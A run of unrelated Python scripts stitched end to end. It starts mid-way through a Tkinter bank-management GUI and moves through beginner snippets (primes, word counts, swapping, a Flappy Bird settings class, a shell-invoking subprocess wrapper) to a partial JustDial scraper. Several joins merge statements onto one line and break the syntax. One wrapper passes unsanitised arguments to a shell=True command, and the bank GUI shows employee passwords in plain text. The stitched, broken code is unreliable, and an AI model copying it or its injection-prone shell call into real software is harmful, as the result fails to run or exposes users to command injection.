            button = Button(search_frame, text='Exit', command=back_page2)
            button.grid()
    else:
        label = Label(search_frame, text="Enter correct account number")
        label.grid()
        button = Button(search_frame, text='Exit', command=back_page2)
        button.grid()
def add():
    frame1.grid_forget()
    def search_in_database():
        def back_page2():
            search_frame.grid_forget()
            page2()
        global result
        global acc_no
        acc_no = entry11.get()
        r = check_string_in_account_no(acc_no)
        if len(acc_no) != 0 and r:
            result = backend.check_acc_no(acc_no)
            print(result)
            if not result:
                label = Label(search_frame, text="invalid account number")
                label.grid(pady=2)
                button = Button(search_frame, text="Exit", command=back_page2)
                button.grid()
                mainloop()
            else:
                def update_money():
                    new_money = entry12.get()
                    backend.update_balance(new_money, acc_no)
                    add_frame.grid_forget()
                    page2()
                search_frame.grid_forget()
                global add_frame
                add_frame = Frame(tk)
                add_frame.grid(padx=400, pady=300)
                detail = backend.get_detail(acc_no)
                label = Label(add_frame, text='Account holder name:   {}'.format(detail[0][0]))
                label.grid(row=0, pady=3)
                label = Label(add_frame, text='Current amount:   {}'.format(detail[0][1]))
                label.grid(row=1, pady=3)
                label = Label(add_frame, text='Enter Money')
                label.grid(row=2, pady=3)
                global entry12
                entry12 = Entry(add_frame)
                entry12.grid(row=3, pady=3)
                button = Button(add_frame, text='Add', command=update_money)
                button.grid(row=4)
                mainloop()
        else:
            label = Label(search_frame, text="Enter correct account number")
            label.grid(pady=2)
            button = Button(search_frame, text="Exit", command=back_page2)
            button.grid()
            mainloop()
    def search_acc():
        global search_frame
        search_frame = Frame(tk)
        search_frame.grid(padx=500, pady=300)
        label = Label(search_frame, text="Enter account number", font='bold')
        label.grid(row=0, pady=6)
        global entry11
        entry11 = Entry(search_frame)
        entry11.grid(row=1, pady=6)
        button = Button(search_frame, text="Search", command=search_in_database)
        button.grid(row=3)
        mainloop()
    search_acc()
def withdraw():
    frame1.grid_forget()
    def search_in_database():
        def go_page2():
            search_frame.grid_forget()
            page2()
        global result
        global acc_no
        acc_no = entry11.get()
        r = check_string_in_account_no(acc_no)
        if len(acc_no) != 0 and r:
            result = backend.check_acc_no(acc_no)
            print(result)
            if not result:
                label = Label(search_frame, text="invalid account number")
                label.grid(pady=2)
                button = Button(search_frame, text="Exit", command=go_page2)
                button.grid()
                mainloop()
            else:
                def deduct_money():
                    new_money = entry12.get()
                    result = backend.deduct_balance(new_money, acc_no)
                    if result:
                        add_frame.grid_forget()
                        page2()
                    else:
                        label = Label(search_frame, text="Insufficient Balance")
                        label.grid(row=4)
                        button = Button(search_frame, text='Exit', command=go_page2)
                        button.grid(row=5)
                        mainloop()
                search_frame.grid_forget()
                global add_frame
                add_frame = Frame(tk)
                add_frame.grid(padx=400, pady=300)
                detail = backend.get_detail(acc_no)
                label = Label(add_frame, text='Account holder name:   {}'.format(detail[0][0]))
                label.grid(row=0, pady=3)
                label = Label(add_frame, text='Current amount:   {}'.format(detail[0][1]))
                label.grid(row=1, pady=3)
                label = Label(add_frame, text='Enter Money')
                label.grid(row=2, pady=3)
                global entry12
                entry12 = Entry(add_frame)
                entry12.grid(row=3, pady=3)
                button = Button(add_frame, text='Withdraw', command=deduct_money)
                button.grid(row=4)
                mainloop()
        else:
            label = Label(search_frame, text="Enter correct account number")
            label.grid(row=4)
            button = Button(search_frame, text='Exit', command=go_page2)
            button.grid(row=5)
            mainloop()
    def search_acc():
        global search_frame
        search_frame = Frame(tk)
        search_frame.grid(padx=500, pady=300)
        label = Label(search_frame, text="Enter account number", font='bold')
        label.grid(row=0, pady=6)
        global entry11
        entry11 = Entry(search_frame)
        entry11.grid(row=1, pady=6)
        button = Button(search_frame, text="Search", command=search_in_database)
        button.grid(row=3)
        mainloop()
    search_acc()
def check():
    frame1.grid_forget()
    def search_in_database():
        def back_page2():
            search_frame.grid_forget()
            page2()
        global result
        global acc_no
        acc_no = entry11.get()
        r = check_string_in_account_no(acc_no)
        if len(acc_no) != 0 and r:
            result = backend.check_acc_no(acc_no)
            print(result)
            if not result:
                label = Label(search_frame, text="invalid account number")
                label.grid(pady=2)
                button = Button(search_frame, text="Exit", command=back_page2)
                button.grid()
                mainloop()
            else:
                def delete_check_frame():
                    check_frame.grid_forget()
                    page2()
                search_frame.grid_forget()
                balance = backend.check_balance(acc_no)
                global check_frame
                check_frame = Frame(tk)
                check_frame.grid(padx=500, pady=300)
                label = Label(check_frame, text='Balance Is:{}'.format(balance), font='bold')
                label.grid(row=0, pady=4)
                button = Button(check_frame, text='Back', command=delete_check_frame, width=20, height=2, bg='red')
                button.grid(row=1)
                mainloop()
        else:
            label = Label(search_frame, text="Enter correct entry")
            label.grid(pady=2)
            button = Button(search_frame, text="Exit", command=back_page2)
            button.grid()
            mainloop()
    def search_acc():
        global search_frame
        search_frame = Frame(tk)
        search_frame.grid(padx=500, pady=300)
        label = Label(search_frame, text="Enter account number", font='bold')
        label.grid(row=0, pady=6)
        global entry11
        entry11 = Entry(search_frame)
        entry11.grid(row=1, pady=6)
        button = Button(search_frame, text="Search", command=search_in_database)
        button.grid(row=3)
        mainloop()
    search_acc()
def update():
    def back_to_page2():
        search_frame.grid_forget()
        page2()
    def show_all_updateble_content():
        def back_to_page2_from_update():
            update_customer_frame.grid_forget()
            page2()
        def update_name():
            def update_name_in_database():
                new_name = entry_name.get()
                r = check_string_in_account_no(new_name)
                if len(new_name) != 0:
                    backend.update_name_in_bank_table(new_name, acc_no)
                    entry_name.destroy()
                    submit_button.destroy()
                    name_label.destroy()
                else:
                    tkinter.messagebox.showinfo('Error', 'Please fill blanks')
                    entry_name.destroy()
                    submit_button.destroy()
                    name_label.destroy()
            global entry_name
            global name_label
            name_label = Label(update_customer_frame, text='Enter new name')
            name_label.grid(row=1, column=1)
            entry_name = Entry(update_customer_frame)
            entry_name.grid(row=1, column=2, padx=2)
            global submit_button
            submit_button = Button(update_customer_frame, text='Update', command=update_name_in_database)
            submit_button.grid(row=1, column=3)
        def update_age():
            def update_age_in_database():
                new_age = entry_name.get()
                r = check_string_in_account_no(new_age)
                if len(new_age) != 0 and r:
                    backend.update_age_in_bank_table(new_age, acc_no)
                    entry_name.destroy()
                    submit_button.destroy()
                    age_label.destroy()
                else:
                    tkinter.messagebox.showinfo('Error', 'Please enter age')
                    entry_name.destroy()
                    submit_button.destroy()
                    age_label.destroy()
            global age_label
            age_label = Label(update_customer_frame, text='Enter new Age:')
            age_label.grid(row=2, column=1)
            global entry_name
            entry_name = Entry(update_customer_frame)
            entry_name.grid(row=2, column=2, padx=2)
            global submit_button
            submit_button = Button(update_customer_frame, text='Update', command=update_age_in_database)
            submit_button.grid(row=2, column=3)
        def update_address():
            def update_address_in_database():
                new_address = entry_name.get()
                if len(new_address) != 0:
                    backend.update_address_in_bank_table(new_address, acc_no)
                    entry_name.destroy()
                    submit_button.destroy()
                    address_label.destroy()
                else:
                    tkinter.messagebox.showinfo('Error', 'Please fill address')
                    entry_name.destroy()
                    submit_button.destroy()
                    address_label.destroy()
            global address_label
            address_label = Label(update_customer_frame, text='Enter new Address:')
            address_label.grid(row=3, column=1)
            global entry_name
            entry_name = Entry(update_customer_frame)
            entry_name.grid(row=3, column=2, padx=2)
            global submit_button
            submit_button = Button(update_customer_frame, text='Update', command=update_address_in_database)
            submit_button.grid(row=3, column=3)
        acc_no = entry_acc.get()
        r = check_string_in_account_no(acc_no)
        if r:
            result = backend.check_acc_no(acc_no)
            if result:
                search_frame.grid_forget()
                global update_customer_frame
                update_customer_frame = Frame(tk)
                update_customer_frame.grid(padx=300, pady=300)
                label = Label(update_customer_frame, text='What do you want to update')
                label.grid(row=0)
                name_button = Button(update_customer_frame, text='Name', command=update_name)
                name_button.grid(row=1, column=0, pady=6)
                age_button = Button(update_customer_frame, text='Age', command=update_age)
                age_button.grid(row=2, column=0, pady=6)
                address_button = Button(update_customer_frame, text='Address', command=update_address)
                address_button.grid(row=3, column=0, pady=6)
                exit_button = Button(update_customer_frame, text='Exit', command=back_to_page2_from_update)
                exit_button.grid(row=4)
                mainloop()
            else:
                label = Label(search_frame, text='Invalid account number')
                label.grid()
                button = Button(search_frame, text='Exit', command=back_to_page2)
                button.grid()
        else:
            label = Label(search_frame, text='Fill account number')
            label.grid()
            button = Button(search_frame, text='Exit', command=back_to_page2)
            button.grid()
    frame1.grid_forget()
    global search_frame
    search_frame = Frame(tk)
    search_frame.grid(padx=500, pady=300)
    label = Label(search_frame, text='Enter account number', font='bold')
    label.grid(pady=4)
    entry_acc = Entry(search_frame)
    entry_acc.grid(pady=4)
    button = Button(search_frame, text='update', command=show_all_updateble_content, bg='red')
    button.grid()
def allmembers():
    def clear_list_frame():
        list_frame.grid_forget()
        page2()
    frame1.grid_forget()
    details = backend.list_all_customers()
    global tk
    global list_frame
    list_frame = Frame(tk)
    list_frame.grid(padx=50, pady=50)
    label = Label(list_frame, text="Acc_no\t\t\tName\t\t\tAge\t\t\tAddress\t\t\tbalance")
    label.grid(pady=6)
    for i in details:
        label = Label(list_frame, text="{}\t\t\t{}\t\t\t{}\t\t\t{}\t\t\t{}".format(i[0], i[1], i[2], i[3], i[4]))
        label.grid(pady=4)
    button = Button(list_frame, text='Back', width=20, height=2, bg='red', command=clear_list_frame)
    button.grid()
    mainloop()
def delete():
    frame1.grid_forget()
    def search_in_database():
        def back_page2():
            search_frame.grid_forget()
            page2()
        global result
        global acc_no
        acc_no = entry11.get()
        r = check_string_in_account_no(acc_no)
        if len(acc_no) != 0 and r:
            result = backend.check_acc_no(acc_no)
            print(result)
            if not result:
                label = Label(search_frame, text="invalid account number")
                label.grid(pady=2)
                button = Button(search_frame, text="Exit", command=back_page2)
                button.grid()
                mainloop()
            else:
                backend.delete_acc(acc_no)
                search_frame.grid_forget()
                page2()
        else:
            label = Label(search_frame, text="Enter correct account number")
            label.grid(pady=2)
            button = Button(search_frame, text="Exit", command=back_page2)
            button.grid()
    def search_acc():
        global search_frame
        search_frame = Frame(tk)
        search_frame.grid(padx=500, pady=300)
        label = Label(search_frame, text="Enter account number", font='bold')
        label.grid(row=0, pady=6)
        global entry11
        entry11 = Entry(search_frame)
        entry11.grid(row=1, pady=6)
        button = Button(search_frame, text="Delete", command=search_in_database)
        button.grid(row=3)
        mainloop()
    search_acc()
def page2():
    def back_to_main_from_page2():
        frame1.grid_forget()
        global frame
        frame = Frame(tk, bg='black')
        frame.grid(padx=500, pady=250)
        button = Button(frame, text="Admin", command=admin_login)
        button.grid(row=0, pady=20)
        button = Button(frame, text="Employee", command=employee_login)
        button.grid(row=1, pady=20)
        button = Button(frame, text="Exit", command=tk.destroy)
        button.grid(row=2, pady=20)
        tk.mainloop()
    frame.grid_forget()
    global frame1
    frame1 = Frame(tk, bg='black')
    frame1.grid(padx=500, pady=100)
    button1 = Button(frame1, text="Create Account", command=create, width=20, height=2)
    button1.grid(row=0, pady=6)
    button2 = Button(frame1, text="Show Details", command=search_acc, width=20, height=2)
    button2.grid(row=1, pady=6)
    button3 = Button(frame1, text="Add balance", command=add, width=20, height=2)
    button3.grid(row=2, pady=6)
    button4 = Button(frame1, text="Withdraw money", command=withdraw, width=20, height=2)
    button4.grid(row=3, pady=6)
    button5 = Button(frame1, text="Check balance", command=check, width=20, height=2)
    button5.grid(row=4, pady=6)
    button6 = Button(frame1, text="Update Account", command=update, width=20, height=2)
    button6.grid(row=5, pady=6)
    button7 = Button(frame1, text="List of all members", command=allmembers, width=20, height=2)
    button7.grid(row=6, pady=6)
    button8 = Button(frame1, text="Delete Account", command=delete, width=20, height=2)
    button8.grid(row=7, pady=6)
    button9 = Button(frame1, text="Exit", command=back_to_main_from_page2, width=20, height=2)
    button9.grid(row=8, pady=6)
    mainloop()
def create_employee():
    def create_emp_in_database():
        def back_to_main_page1_from_create_emp():
            frame_create_emp.grid_forget()
            page1()
        name = entry3.get()
        password = entry4.get()
        salary = entry16.get()
        position = entry17.get()
        if len(name) != 0 and len(password) != 0 and len(salary) != 0 and len(position) != 0:
            backend.create_employee(name, password, salary, position)
            frame_create_emp.grid_forget()
            page1()
        else:
            label = Label(frame_create_emp, text="Please fill all entries")
            label.grid(pady=2)
            button = Button(frame_create_emp, text="Exit", command=back_to_main_page1_from_create_emp, bg='red')
            button.grid()
    page1_frame.grid_forget()
    global frame_create_emp
    frame_create_emp = Frame(tk, bg='black')
    frame_create_emp.grid(padx=500, pady=200)
    label = Label(frame_create_emp, text='Name:', font='bold')
    label.grid(row=0, pady=4)
    global entry3
    entry3 = Entry(frame_create_emp)
    entry3.grid(row=1, pady=4)
    label2 = Label(frame_create_emp, text='Password', font='bold')
    label2.grid(row=2, pady=4)
    global entry4
    entry4 = Entry(frame_create_emp)
    entry4.grid(row=3, pady=4)
    label3 = Label(frame_create_emp, text='Salary', font='bold')
    label3.grid(row=4, pady=4)
    global entry16
    entry16 = Entry(frame_create_emp)
    entry16.grid(row=5, pady=4)
    label4 = Label(frame_create_emp, text='Position', font='bold')
    label4.grid(row=6, pady=4)
    global entry17
    entry17 = Entry(frame_create_emp)
    entry17.grid(row=7, pady=4)
    button = Button(frame_create_emp, text='Submit', command=create_emp_in_database, width=15, height=2)
    button.grid(row=8, pady=4)
    mainloop()
def update_employee():
    def update_details_of_staff_member():
        def back_to_page1():
            show_employee_frame.grid_forget()
            page1()
        def update_that_particular_employee():
            show_employee_frame.grid_forget()
            def back_to_page1_from_update():
                update_frame.destroy()
                page1()
            def update_name_in_database():
                def database_calling():
                    new_name = entry19.get()
                    if len(new_name) != 0:
                        old_name = staff_name.get()
                        backend.update_employee_name(new_name, old_name)
                        entry19.destroy()
                        update_button.destroy()
                    else:
                        entry19.destroy()
                        update_button.destroy()
                        tkinter.messagebox.showinfo('Error', 'Please fill entry')
                global entry19
                entry19 = Entry(update_frame)
                entry19.grid(row=1, column=1, padx=4)
                global update_button
                update_button = Button(update_frame, text='Update', command=database_calling)
                update_button.grid(row=1, column=2, padx=4)
            def update_password_in_database():
                def database_calling():
                    new_password = entry19.get()
                    old_name = staff_name.get()
                    if len(new_password) != 0:
                        backend.update_employee_password(new_password, old_name)
                        entry19.destroy()
                        update_button.destroy()
                    else:
                        entry19.destroy()
                        update_button.destroy()
                        tkinter.messagebox.showinfo('Error', 'Please Fill Entry')
                global entry19
                entry19 = Entry(update_frame)
                entry19.grid(row=2, column=1, padx=4)
                global update_button
                update_button = Button(update_frame, text='Update', command=database_calling)
                update_button.grid(row=2, column=2, padx=4)
            def update_salary_in_database():
                def database_calling():
                    new_salary = entry19.get()
                    r = check_string_in_account_no(new_salary)
                    if len(new_salary) != 0 and r:
                        old_name = staff_name.get()
                        backend.update_employee_salary(new_salary, old_name)
                        entry19.destroy()
                        update_button.destroy()
                    else:
                        entry19.destroy()
                        update_button.destroy()
                        tkinter.messagebox.showinfo('Error', 'Invalid Input')
                global entry19
                entry19 = Entry(update_frame)
                entry19.grid(row=3, column=1, padx=4)
                global update_button
                update_button = Button(update_frame, text='Update', command=database_calling)
                update_button.grid(row=3, column=2, padx=4)
            def update_position_in_database():
                def database_calling():
                    new_position = entry19.get()
                    if len(new_position) != 0:
                        old_name = staff_name.get()
                        backend.update_employee_position(new_position, old_name)
                        entry19.destroy()
                        update_button.destroy()
                    else:
                        entry19.destroy()
                        update_button.destroy()
                        tkinter.messagebox.showinfo('Error', 'Please Fill Entry')
                global entry19
                entry19 = Entry(update_frame)
                entry19.grid(row=4, column=1, padx=4)
                global update_button
                update_button = Button(update_frame, text='Update', command=database_calling)
                update_button.grid(row=4, column=2, padx=4)
            global update_frame
            update_frame = Frame(tk)
            update_frame.grid(padx=400, pady=250)
            label = Label(update_frame, text='press what do you want to update', font='bold')
            label.grid(pady=6)
            button = Button(update_frame, text='Name', command=update_name_in_database, width=14, height=2)
            button.grid(row=1, column=0, padx=2, pady=2)
            button = Button(update_frame, text='password', command=update_password_in_database, width=14, height=2)
            button.grid(row=2, column=0, padx=2, pady=2)
            button = Button(update_frame, text='salary', command=update_salary_in_database, width=14, height=2)
            button.grid(row=3, column=0, padx=2, pady=2)
            button = Button(update_frame, text='position', command=update_position_in_database, width=14, height=2)
            button.grid(row=4, column=0, padx=2, pady=2)
            button = Button(update_frame, text='Back', command=back_to_page1_from_update, width=14, height=2)
            button.grid(row=5, column=0, pady=2)
        name = staff_name.get()
        if len(name) != 0:
            result = backend.check_name_in_staff(name)
            if result:
                update_that_particular_employee()
            else:
                label = Label(show_employee_frame, text='Employee not found')
                label.grid()
                button = Button(show_employee_frame, text='Exit', command=back_to_page1)
                button.grid()
        else:
            label = Label(show_employee_frame, text='Fill the name')
            label.grid()
            button = Button(show_employee_frame, text='Exit', command=back_to_page1)
            button.grid()
    page1_frame.grid_forget()
    global show_employee_frame
    show_employee_frame = Frame(tk)
    show_employee_frame.grid(padx=300, pady=300)
    label = Label(show_employee_frame, text='Enter name of staff member whom detail would you want to update')
    label.grid()
    global staff_name
    staff_name = Entry(show_employee_frame)
    staff_name.grid()
    global update_butoon_for_staff
    update_butoon_for_staff = Button(show_employee_frame, text='Update Details', command=update_details_of_staff_member)
    update_butoon_for_staff.grid()
def show_employee():
    def back_to_main_page1():
        show_employee_frame.grid_forget()
        page1()
    page1_frame.grid_forget()
    global show_employee_frame
    show_employee_frame = Frame(tk)
    show_employee_frame.grid(padx=50, pady=50)
    label = Label(show_employee_frame, text='Name\t\t\tSalary\t\t\tPosition\t\t\tpassword', font='bold')
    label.grid(row=0)
    details = backend.show_employees()
    for i in details:
        label = Label(show_employee_frame, text="{}\t\t\t{}\t\t\t{}\t\t\t{}".format(i[0], i[1], i[2], i[3]))
        label.grid(pady=4)
    button = Button(show_employee_frame, text='Exit', command=back_to_main_page1, width=20, height=2, bg='red',
                    font='bold')
    button.grid()
    mainloop()
def Total_money():
    def back_to_main_page1_from_total_money():
        all_money.grid_forget()
        page1()
    page1_frame.grid_forget()
    all = backend.all_money()
    global all_money
    all_money = Frame(tk)
    all_money.grid(padx=500, pady=300)
    label = Label(all_money, text="Total Amount of money")
    label.grid(row=0, pady=6)
    label = Label(all_money, text='{}'.format(all))
    label.grid(row=1)
    button = Button(all_money, text="Back", command=back_to_main_page1_from_total_money, width=15, height=2)
    button.grid(row=3)
    mainloop()
def back_to_main():
    page1_frame.grid_forget()
    global frame
    frame = Frame(tk, bg='black')
    frame.grid(padx=500, pady=250)
    button = Button(frame, text="Admin", command=admin_login)
    button.grid(row=0, pady=20)
    button = Button(frame, text="Employee", command=employee_login)
    button.grid(row=1, pady=20)
    button = Button(frame, text="Exit", command=tk.destroy)
    button.grid(row=2, pady=20)
    tk.mainloop()
    mainloop()
def page1():
    def back_to_main2():
        admin_frame.grid_forget()
        global frame
        frame = Frame(tk, bg='black')
        frame.grid(padx=500, pady=250)
        button = Button(frame, text="Admin", command=admin_login)
        button.grid(row=0, pady=20)
        button = Button(frame, text="Employee", command=employee_login)
        button.grid(row=1, pady=20)
        button = Button(frame, text="Exit", command=tk.destroy)
        button.grid(row=2, pady=20)
        tk.mainloop()
        mainloop()
    name = entry1.get()
    password = entry2.get()
    if len(name) != 0 and len(password) != 0:
        result = backend.check_admin(name, password)
        print(result)
        if result:
            admin_frame.grid_forget()
            global page1_frame
            page1_frame = Frame(tk, bg='black')
            page1_frame.grid(padx=500, pady=200)
            button10 = Button(page1_frame, text="New Employee", command=create_employee, width=20, height=2)
            button10.grid(row=0, pady=6)
            button11 = Button(page1_frame, text="Update detail", command=update_employee, width=20, height=2)
            button11.grid(row=1, pady=6)
            button13 = Button(page1_frame, text="Show All Employee", command=show_employee, width=20, height=2)
            button13.grid(row=2, pady=6)
            button11 = Button(page1_frame, text="Total Money", command=Total_money, width=20, height=2)
            button11.grid(row=3, pady=6)
            button12 = Button(page1_frame, text="Back", command=back_to_main, width=20, height=2)
            button12.grid(row=4, pady=6)
            mainloop()
        else:
            label = Label(admin_frame, text="Invalid id and pasasword")
            label.grid(row=6, pady=10)
            button = Button(admin_frame, text='Exit', command=back_to_main2)
            button.grid(row=7)
            mainloop()
    else:
        label = Label(admin_frame, text="Please fill All Entries")
        label.grid(row=6, pady=10)
        button = Button(admin_frame, text='Exit', command=back_to_main2)
        button.grid(row=7)
        mainloop()
def employee_login():
    def back_to_main3():
        employee_frame.grid_forget()
        global frame
        frame = Frame(tk, bg='black')
        frame.grid(padx=400, pady=250)
        button = Button(frame, text="Admin", command=admin_login)
        button.grid(row=0, pady=20)
        button = Button(frame, text="Employee", command=employee_login)
        button.grid(row=1, pady=20)
        button = Button(frame, text="Exit", command=tk.destroy)
        button.grid(row=2, pady=20)
        tk.mainloop()
        mainloop()
    def check_emp():
        name = entry1.get()
        password = entry2.get()
        if len(name) != 0 and len(password) != 0:
            result = backend.check_employee(name, password)
            print(result)
            if result:
                employee_frame.grid_forget()
                page2()
            else:
                label = Label(employee_frame, text="Invalid id and pasasword")
                label.grid(row=6, pady=10)
                button = Button(employee_frame, text='Exit', command=back_to_main3)
                button.grid(row=7)
                mainloop()
        else:
            label = Label(employee_frame, text="Please Fill All Entries")
            label.grid(row=6, pady=10)
            button = Button(employee_frame, text='Exit', command=back_to_main3)
            button.grid(row=7)
            mainloop()
    frame.grid_forget()
    global employee_frame
    employee_frame = Frame(tk, bg='black')
    employee_frame.grid(padx=500, pady=200)
    label = Label(employee_frame, text="Employee Login", font='bold')
    label.grid(row=0, pady=20)
    label1 = Label(employee_frame, text="Name:")
    label1.grid(row=1, pady=10)
    label2 = Label(employee_frame, text="Password:")
    label2.grid(row=3, pady=10)
    global entry1
    global entry2
    entry1 = Entry(employee_frame)
    entry1.grid(row=2, pady=10)
    entry2 = Entry(employee_frame, show='*')
    entry2.grid(row=4, pady=10)
    button = Button(employee_frame, text="Submit", command=check_emp)
    button.grid(row=5, pady=20)
    mainloop()
def admin_login():
    frame.grid_forget()
    global admin_frame
    admin_frame = Frame(tk, bg='black')
    admin_frame.grid(padx=500, pady=250)
    label = Label(admin_frame, text="Admin Login", font='bold')
    label.grid(row=0, pady=20)
    label1 = Label(admin_frame, text="Name:")
    label1.grid(row=1, pady=10)
    label2 = Label(admin_frame, text="Password:")
    label2.grid(row=3, pady=10)
    global entry1
    global entry2
    entry1 = Entry(admin_frame)
    entry1.grid(row=2, pady=10)
    entry2 = Entry(admin_frame, show='*')
    entry2.grid(row=4, pady=10)
    button = Button(admin_frame, text="Submit", command=page1)
    button.grid(row=5, pady=20)
    mainloop()
global tk
tk = Tk()
tk.config(bg='black')
tk.title('Bank Managing System')
tk.minsize(1200, 800)
tk.maxsize(1200, 800)
global frame
frame = Frame(tk, bg='black')
frame.grid(padx=500, pady=250)
button = Button(frame, text="Admin", command=admin_login)
button.grid(row=0, pady=20)
button = Button(frame, text="Employee", command=employee_login)
button.grid(row=1, pady=20)
button = Button(frame, text="Exit", command=tk.destroy)
button.grid(row=2, pady=20)
tk.mainloop()
side = 2
area = side**2
print(f"Area of the given square is {area}.")
import sys
def find_prime(num):
    res_list = []
    for i in range(2, num + 1):
        if res_list != [] and any(i % l == 0 for l in res_list):
            continue
        res_list.append(i)
    return res_list
if __name__ == "__main__":
    if len(sys.argv) != 2: raise Exception("usage - $python find_prime.py <num:int>")
    try:
        num = int(sys.argv[1])
    except ValueError:
        raise Exception("Enter an integer as argument only.")
    l = find_prime(num)
    print(l)
s = "I work in bloomberg founded by bloomberg work work"
tokens = s.split(" ")
d = {}
for token in tokens:
    if token in d:
        d[token] += 1
    else:
        d[token] = 1
print(d)n1=input("Enter first number")
n2=input("Enter second number")
sum=float(n1)+float(n2)
print("Sum is:",sum)x = 5
y = 10
temp = x
x = y
y = temp
print('The value of x after swapping: {}'.format(x))
print('The value of y after swapping: {}'.format(y))
import os
from json import dumps
from json import loads
class Settings(object):
    window_name = "Flappy Bird"
    window_rz = (False, False)
    window_fullscreen = True
    window_width = None
    window_height = None
    button_width = 22
    button_height = 17
    button_bg = "black"
    button_fg = "white"
    button_activebackground = "black"
    button_font = ("Impact", 40)
    button_position_y = 85
    button_cursor = "hand2"
    scoreboard_width = 40
    scoreboard_height = 40
    scoreboard_position_y = 50
    text_font = "Autumn"
    text_fill = "White"
    title_width = 35
    title_height = 15
    title_position_y = 15
    bird_event = "<Up>"
    window_fullscreen_event = "<F11>"
    window_start_event = "<Return>"
    window_exit_event = "<Escape>"
    background_fp = "Images/background.png"
    bird_fp = "Images/bird.png"
    startButton_fp = "Images/start_button.png"
    exitButton_fp = "Images/exit_button.png"
    tube_fp = ["Images/tube.png", "Images/tube_mouth.png"]
    title_fp = "Images/title.png"
    scoreboard_fp = "Images/scoreboard.png"
    score_fp = "Data/scr.txt"
    settings_fp = "Data/settings.json"
    background_animation = True
    images_fp = [background_fp, bird_fp, startButton_fp, exitButton_fp, tube_fp[0], tube_fp[1], title_fp]
    def setOptions(self):
        attributes = "window_fullscreen,window_width,window_height".split(',')
        try:
            file = open(self.settings_fp, 'r')
            data = loads(file.read())
            file.close()
            for attr in data:
                if "event" in attr or attr in attributes:
                    setattr(Settings, attr, data[attr])
        except BaseException:
            if not os.path.exists(os.path.split(self.settings_fp)[0]):
                os.mkdir(os.path.split(self.settings_fp)[0])
            file = open(self.settings_fp, 'w')
            data = dict()
            for attr in Settings.__dict__:
                if "event" in attr or attr in attributes:
                    data[attr] = Settings.__dict__[attr]
            file.write(dumps(data, indent=2))
            file.close()
try:
    input = raw_input
except NameError:
    pass
def count_chars(filename):
    count = {}
    with open(filename) as info:  
        readfile = info.read()
        for character in readfile.upper():
            count[character] = count.get(character, 0) + 1
    return count
def main():
    is_exist = True
    while (is_exist):
        try:
            inputFile = input("File Name / (0)exit : ").strip()
            if inputFile == "0":
                break
            print(count_chars(inputFile))
        except FileNotFoundError:
            print("File not found...Try again!")
if __name__ == '__main__':
    main()
from appJar import gui
def press():
    print(p.getListBox('Liste'))
p = gui()
p.setSize(300,200)
p.addListBox('Liste', ['A','B','C','D'])
p.addButton('Buton', press)
p.go()def next_square():
    i = 1
    while True:
        yield i * i
        i += 1
for n in next_square():
    if n > 25:
        break
    print(n)
import random
from sys import argv
stake = int(argv[1])
goals = int(argv[2])
trials = int(argv[3])
wins = 0
bets = 0
for i in range(trials):
    cash = stake
    while cash > 0 and cash < goals:
        bets += 1
        if random.randrange(0, 2) == 0:
            cash += 1
        else:
            cash -= 1
    if cash == goals:
        wins += 1
print("Your won: " + str(100 * wins // trials) + "$")
print("Your bets: " + str(bets // trials))
a = ["Hello", 35, "b", 45.5, "world", 60]
i = f = s = 0
for j in a:
    if isinstance(j, int):
        i = i + 1
    elif isinstance(j, float):
        f = f + 1
    else:
        s = s + 1
print(f"Number of integers are: {i}")
print(f"Number of Floats are: {f}")
print(f"numbers of strings are: {s}")
from __future__ import print_function
import os
try:
    input = raw_input()
except NameError:
    pass
def main():
    CheckDir = input("Enter the name of the directory to check : ")
    if os.path.exists(CheckDir):  
        print("The directory exists")
    else:
        print("No directory found for " + CheckDir)  
        option = input("Would you like this directory create? y/n: ")
        if option == 'n':
            print("Goodbye")
            exit()
        if option == 'y':
            os.makedirs(CheckDir)  
            print("Directory created for " + CheckDir)
        else:
            print("Not an option. Exiting")
            exit()
if __name__ == '__main__':
    main()
str = input("Enter a string: ")
counter = 0
for s in str:
      counter = counter+1
print("Length of the input string is:", counter)
import os
import subprocess
import sys
def instasubprocess(user, tags, type, productId):
    try:
        child_env = sys.executable
        file_pocessing = os.getcwd() + "/insta_datafetcher.py " + user + " " + tags + " " + type + " " + productId
        command = child_env + " " + file_pocessing
        result = subprocess.Popen(command, shell=True)
        result.wait()
    except:
        print("error::instasubprocess>>", sys.exc_info()[1])
if __name__ == '__main__':
    instasubprocess(user="u2", tags="food", type="hashtags", productId="abc")
import csv
import threading
import urllib.request
from tkinter import HORIZONTAL, Button, Entry, Label, Tk
from tkinter.ttk import Progressbar
from bs4 import BeautifulSoup
class ScrapperLogic:
    def __init__(self, query, location, file_name, progressbar, label_progress):
        self.query = query
        self.location = location
        self.file_name = file_name
        self.progressbar = progressbar
        self.label_progress = label_progress
    def inner_html(element):
        return element.decode_contents(formatter="html")
    def get_name(body):
        return body.find("span", {"class": "jcn"}).a.string
    def which_digit(html):
        mapping_dict = {
            "icon-ji": 9,
            "icon-dc": "+",
            "icon-fe": "(",
            "icon-hg": ")",
            "icon-ba": "-",
            "icon-lk": 8,
            "icon-nm": 7,
            "icon-po": 6,
            "icon-rq": 5,
            "icon-ts": 4,
            "icon-vu": 3,
            "icon-wx": 2,
            "icon-yz": 1,
            "icon-acb": 0,
        }
        return mapping_dict.get(html, "")
    def get_phone_number(self, body):
        i = 0
        phone_no = "No Number!"
        try:
            for item in body.find("p", {"class": "contact-info"}):
                i += 1
                if i == 2:
                    phone_no = ""
                    try:
                        for element in item.find_all(class_=True):
                            classes = []
                            classes.extend(element["class"])
                            phone_no += str((self.which_digit(classes[1])))
                    except Exception:
                        pass
        except Exception:
            pass
        body = body["data-href"]
        soup = BeautifulSoup(body, "html.parser")
        for a in soup.find_all("a", {"id": "whatsapptriggeer"}):
            phone_no = str(a["href"][-10:])
        return phone_no
    def get_rating(body):
        rating = 0.0
        text = body.find("span", {"class": "star_m"})
        if text is not None:
            for item in text:
                rating += float(item["class"][0][1:]) / 10
        return rating
    def get_rating_count(body):
        text = body.find("span", {"class": "rt_count"}).string
        rating_count = "".join(i for i in text if i.isdigit())
        return rating_count
    def get_address(body):
        return body.find("span", {"class": "mrehover"}).text.strip()
    def get_location(body):
        text = body.find("a", {"class": "rsmap"})
        if not text:
            return
        text_list = text["onclick"].split(",")
        latitude = text_list[3].strip().replace("'", "")
        longitude = text_list[4].strip().replace("'", "")
        return latitude + ", " + longitude
    def start_scrapping_logic(self):
        page_number = 1
        service_count = 1
        total_url = "https://www.justdial.com/{0}/{1}".format(self.location, self.query)
        fields = ["Name", "Phone", "Rating", "Rating Count", "Address", "Location"]
